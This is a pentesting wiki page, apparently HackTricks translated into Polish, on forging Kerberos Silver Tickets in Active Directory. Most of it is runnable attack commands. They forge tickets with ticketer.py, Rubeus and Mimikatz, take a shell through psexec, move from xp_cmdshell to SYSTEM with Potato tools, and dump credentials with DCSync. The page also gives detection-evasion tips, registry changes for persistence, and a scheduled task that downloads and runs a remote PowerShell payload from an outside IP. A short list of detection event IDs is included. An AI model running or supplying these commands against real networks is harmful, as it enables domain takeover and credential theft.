# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Atak **Silver Ticket** polega na wykorzystywaniu ticketów usługowych w środowiskach Active Directory (AD). Ta metoda opiera się na **uzyskaniu NTLM hasha konta usługi**, takiego jak konto komputera, aby sfałszować Ticket Granting Service (TGS) ticket. Za pomocą tego sfałszowanego ticketu atakujący może uzyskać dostęp do konkretnych usług w sieci, **podszywając się pod dowolnego użytkownika**, zazwyczaj dążąc do uprawnień administracyjnych. Należy podkreślić, że użycie kluczy AES do podrabiania ticketów jest bezpieczniejsze i trudniej wykrywalne.

> [!WARNING]
> Silver Tickets są mniej wykrywalne niż Golden Tickets, ponieważ wymagają tylko **hasha konta usługi**, a nie konta krbtgt. Jednak są ograniczone do konkretnej usługi, którą celują. Ponadto, po prostu kradzież hasła użytkownika.
> Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

### Modern Kerberos changes (AES-only domains)

- Windows updates starting **8 Nov 2022 (KB5021131)** default service tickets to **AES session keys** when possible and are phasing out RC4. DCs are expected to ship with RC4 **disabled by default by mid‑2026**, so relying on NTLM/RC4 hashes for silver tickets increasingly fails with `KRB_AP_ERR_MODIFIED`. Always extract **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) for the target service account.
- If the service account `msDS-SupportedEncryptionTypes` is restricted to AES, you must forge with `/aes256` or `-aesKey`; RC4 (`/rc4` or `-nthash`) will not work even if you hold the NTLM hash.
- gMSA/computer accounts rotate every 30 days; dump the **current AES key** from LSASS, Secretsdump/NTDS, or DCsync before forging.
- OPSEC: default ticket lifetime in tools is often **10 years**; set realistic durations (e.g., `-duration 600` minutes) to avoid detection by abnormal lifetimes.

For ticket crafting, different tools are employed based on the operating system:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### W systemie Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Usługa CIFS jest wyróżniona jako powszechny cel do uzyskania dostępu do systemu plików ofiary, ale inne usługi, takie jak HOST i RPCSS, mogą być również wykorzystane do wykonywania zadań i zapytań WMI.

### Przykład: usługa MSSQL (MSSQLSvc) + Potato do SYSTEM

Jeśli posiadasz NTLM hash (lub AES key) konta SQL service account (np. sqlsvc), możesz sfałszować TGS dla MSSQL SPN i impersonate dowolnego użytkownika względem usługi SQL. Stamtąd włącz xp_cmdshell, aby uruchamiać polecenia jako SQL service account. Jeśli ten token ma SeImpersonatePrivilege, chain a Potato, aby elevate do SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Jeśli powstały kontekst ma SeImpersonatePrivilege (często prawda dla kont usługowych), użyj wariantu Potato, aby uzyskać SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
More details on abusing MSSQL and enabling xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques overview:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostępne usługi

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>W zależności od systemu także:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>W niektórych przypadkach możesz po prostu poprosić o: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets ID zdarzeń

- 4624: Logowanie konta
- 4634: Wylogowanie konta
- 4672: Logowanie administratora
- **No preceding 4768/4769 on the DC** for the same client/service is a common indicator of a forged TGS being presented directly to the service.
- Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data.

## Utrzymywanie dostępu

Aby zapobiec rotacji hasła maszyn co 30 dni ustaw `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` albo możesz ustawić `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na wartość większą niż 30 dni, aby wskazać okres rotacji, kiedy hasło maszyny powinno być zmieniane.

## Abusing Service tickets

W poniższych przykładach załóżmy, że ticket został uzyskany podszywając się pod konto administratora.

### CIFS

Dzięki temu ticketowi będziesz mógł uzyskać dostęp do `C$` i `ADMIN$` folderu przez **SMB** (jeśli są udostępnione) i skopiować pliki do części zdalnego systemu plików robiąc coś w stylu:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Będziesz także w stanie uzyskać powłokę na hoście lub wykonać dowolne polecenia za pomocą **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Dzięki temu uprawnieniu możesz tworzyć zaplanowane zadania na zdalnych komputerach i wykonywać dowolne polecenia:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Dzięki tym tickets możesz **uruchomić WMI na systemie ofiary**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Znajdź **więcej informacji o wmiexec** na następującej stronie:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mając dostęp do komputera przez winrm możesz **uzyskać dostęp** i nawet otrzymać PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Sprawdź następującą stronę, aby dowiedzieć się **więcej sposobów łączenia się ze zdalnym hostem przy użyciu winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Zwróć uwagę, że **winrm musi być aktywny i nasłuchiwać** na zdalnym komputerze, aby uzyskać do niego dostęp.

### LDAP

Posiadając to uprawnienie, możesz zrzucić bazę danych DC używając **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Dowiedz się więcej o DCSync** na poniższej stronie:


{{#ref}}
dcsync.md
{{#endref}}


## Źródła

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
